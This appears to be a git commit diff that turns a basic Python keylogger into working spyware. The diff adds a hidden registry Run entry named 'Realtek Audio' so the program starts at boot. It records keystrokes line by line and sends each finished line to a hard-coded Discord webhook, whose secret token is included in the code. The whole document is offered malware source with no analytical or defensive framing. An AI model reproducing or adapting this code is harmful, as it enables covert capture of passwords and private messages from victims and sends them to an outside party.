b70064b796d6794fe3e06a9a4815059792ec89b5
eroge-69 <erogexunamed@gmail.com>
2025-09-04 22:48:42 +0700

    Upload keylogger.py via PY to EXE tool

--- python-files/keylogger.py
+++ python-files/keylogger.py
@@ -1,17 +1,46 @@
-from pynput import keyboard
-import time
+from pynput.keyboard import Key, Listener
+from discord_webhook import DiscordWebhook
+import pathlib, sys
+import threading, subprocess
 
-def keyPressed(key):
-    with open("keyfile.txt", 'a') as logKey:
-        try:
-            logKey.write(key.char)
-        except AttributeError:
-            logKey.write(f" [{key}] ")
+lista = []
+lista_salvar = ''
 
-# Start the listener
-listener = keyboard.Listener(on_press=keyPressed)
+local = str(pathlib.Path().absolute())
+name = sys.argv[0]
+
+path = local+name
+
+subprocess.Popen('REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Realtek Audio\" /t REG_SZ /d \"'+path+'\" /f', shell = True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+
+def on_press(msg):
+    global lista,lista_salvar
+    try:
+        lista.append(msg.char)
+    except:
+        if msg == Key.enter:
+            lista.append('\n')
+            lista_salvar = ''.join(lista)
+            lista = []
+
+        elif msg == Key.space:
+            lista.append(' ')
+
+        elif msg == Key.backspace:
+            try:
+                lista.pop()
+            except:
+                pass
+
+        else:
+            pass
+
+listener = Listener(on_press=on_press)
 listener.start()
 
-# Keep the script alive without showing console (when saved as .pyw)
 while True:
-    time.sleep(10)
+    if lista_salvar:
+        webhook_urls = ['https://discord.com/api/webhooks/1413065804173541449/XlAyiWjlX1wxUa7uIUfO9Z539mdsiiMcuFY7DqCC25BQPtLmxMj1vE1Ko-Wtet5mNqO3']
+        webhook = DiscordWebhook(url=webhook_urls, content=lista_salvar)
+        response = webhook.execute()
+        lista_salvar = ''
